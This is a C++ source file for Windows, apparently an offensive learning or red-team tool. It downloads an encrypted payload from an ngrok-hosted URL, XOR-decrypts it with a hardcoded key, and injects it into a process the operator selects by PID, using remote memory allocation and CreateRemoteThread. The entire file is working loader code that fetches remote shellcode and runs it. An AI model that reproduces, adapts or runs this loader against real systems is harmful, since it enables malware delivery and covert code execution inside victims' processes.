#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <tlhelp32.h>

/*
	g++ .\client.cpp -o client.exe -s -Os -lwininet
*/


const LPCWSTR url = L"https://24ab6e9116c7.ngrok-free.app/payload.raw"; 
const char* key = "rzdhop_is_a_nice_guy";
size_t sKey = 20;

void XOR(PUCHAR data, size_t data_sz, PUCHAR key, size_t key_sz) {
    for (size_t i = 0; i < data_sz; i++) {
        data[i] ^= key[i % key_sz];
    }
}

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
    BOOL bSTATE = TRUE;
    HINTERNET hInternet = NULL, hInternetFile = NULL;
    DWORD dwBytesRead = 0;
    SIZE_T sSize = 0;
    PBYTE pBytes = NULL, pTmpBytes = NULL;

    printf("[*] Init WinINet session (User-Agent:'rzdhop-agent')\n");
    hInternet = InternetOpenW(L"rzdhop-agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[*] Open remote ressource using WinINet session's handle\n");
    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[*] Allocating ReadBuff of 1024bytes\n");
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE) {
        printf("[*] Reading 1024 bytes\n");
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            bSTATE = FALSE; goto _EndOfFunction;
        }

        if (dwBytesRead == 0) break;

        SIZE_T newSize = sSize + dwBytesRead;
        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, newSize);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, newSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        memcpy(pBytes + sSize, pTmpBytes, dwBytesRead);
        sSize = newSize;
        memset(pTmpBytes, 0, dwBytesRead);
    }
    printf("[*] Done Reading remote file\n");

    *pPayloadBytes = pBytes;
    *sPayloadSize  = sSize;

_EndOfFunction:
    if (hInternetFile) InternetCloseHandle(hInternetFile);
    if (hInternet) InternetCloseHandle(hInternet);
    if (pTmpBytes) LocalFree(pTmpBytes);

    return bSTATE;
}

int enumProc() {
    int proc_cnt = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32First(snapshot, &pe32)) {
        do {
            printf("[PID: %u] %s\n", pe32.th32ProcessID, pe32.szExeFile);
            proc_cnt++;
        } while (Process32Next(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return proc_cnt;
}

DWORD choosePID() {
    int proc_cnt = enumProc();
    if (proc_cnt <= 0) return 0;

    DWORD choice = 0;
    while (choice <= 4) {
        printf("[PID] > ");
        scanf("%lu", &choice);
        if (choice <= 4) {
            printf("[-] Bad PID.\n");
        }
    }
    return choice;
}

int injectProcByPID(DWORD PID, PBYTE pPayloadBytes, SIZE_T sPayloadSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        return -1;
    }

    LPVOID memPoolPtr = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!memPoolPtr) {
        printf("[-] VirtualAllocEx failed\n");
        CloseHandle(hProcess);
        return -1;
    }

    printf("[+] Mem page allocated at: 0x%p\n", memPoolPtr);

    if (!WriteProcessMemory(hProcess, memPoolPtr, pPayloadBytes, sPayloadSize, NULL)) {
        printf("[-] WriteProcessMemory failed\n");
        VirtualFreeEx(hProcess, memPoolPtr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memPoolPtr, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed\n");
        VirtualFreeEx(hProcess, memPoolPtr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    printf("[+] Remote thread created.\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Shellcode done.\n");

    VirtualFreeEx(hProcess, memPoolPtr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

int main(int argc, char **argv) {
    PBYTE pPayloadBytes = NULL;
    SIZE_T sPayloadSize = 0;

    printf("[*] Getting Payload from %s\n", url);
    if (!GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize)) {
        printf("[-] Failed to get payload\n");
        return -1;
    }
    printf("[*] Payload retreived from server (size :%zu)\n", sPayloadSize);
    // XOR decrypt payload
    XOR(pPayloadBytes, sPayloadSize, (PUCHAR)key, sKey);
    printf("[*] Payload deciphered : 0x%02x%02x%02x%02x%02x%02x...\n",
    pPayloadBytes[0], pPayloadBytes[1], pPayloadBytes[2],
    pPayloadBytes[3], pPayloadBytes[4], pPayloadBytes[5]);

    DWORD PID = choosePID();
    if (PID == 0) return -1;

    injectProcByPID(PID, pPayloadBytes, sPayloadSize);

    if (pPayloadBytes) LocalFree(pPayloadBytes);
    return 0;
}
